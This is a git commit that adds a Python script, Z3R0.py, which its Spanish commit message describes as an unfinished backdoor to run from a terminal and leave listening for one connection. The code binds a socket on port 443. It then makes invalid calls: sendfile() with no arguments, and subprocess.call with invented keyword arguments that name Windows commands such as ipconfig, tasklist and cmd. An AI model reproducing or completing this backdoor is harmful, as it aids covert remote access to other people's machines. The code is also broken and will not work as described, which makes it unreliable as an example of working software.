58c3ea09a4a8e2090d168bb52a569edfdde76af2
Shadow_ <95306026+OnixZeny@users.noreply.github.com>
2022-04-13 20:23:15 -0500

    este backdoor aun falta por desarrollar.
    para usarlo dirigete a tu terminal Windows(cmd o powershell) o terminal linux etc, estando ahi, ejecuta el archivo con el siguiente comando
    python Z3R0.py 
    automaticamente este te pondra en modo escucha con capacidad de estar en modo escucha con (1) solo usuario, ud puede modificar el backdoor a su gusto e incluso el logo y mejorarlo si quiere, pero la licencia pertenece 100% TEAM Z3R0.

---
+++ Z3R0.py
@@ -0,0 +1,35 @@
+﻿import socket
+import subprocess
+ 
+
+print("███████╗██████╗░██████╗░░█████╗░ ████████╗███████╗░█████╗░███╗░░░███╗")
+print("╚════██║╚════██╗██╔══██╗██╔══██╗ ╚══██╔══╝██╔════╝██╔══██╗████╗░████║")
+print("░░███╔═╝░█████╔╝██████╔╝██║░░██║ ░░░██║░░░█████╗░░███████║██╔████╔██║")
+print("██╔══╝░░░╚═══██╗██╔══██╗██║░░██║ ░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║")
+print("███████╗██████╔╝██║░░██║╚█████╔╝ ░░░██║░░░███████╗██║░░██║██║░╚═╝░██║")
+print("╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░ ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝")
+
+conexion = socket.socket()
+conexion.bind( ('localhost', 443) )
+conexion.listen(1)
+
+while True:
+    conexion, addr = conexion.accept()
+    print("[+] conexion establecida")
+    print("addr")
+    conexion.sendfile()
+    conexion.close()
+
+
+
+    def Army():
+     Army = subprocess.call(Army=True)
+     Army.call(ipconfig=True)
+     Army.call(cd=True)
+     Army.call(Tasklist=True)
+     Army.call(dir=True)
+     Army.call(start=True)
+     Army.call(cls=True)
+     Army.call(cmd=True)
+     Army.call(mkdir=True)
+     Army.call(ping=True)
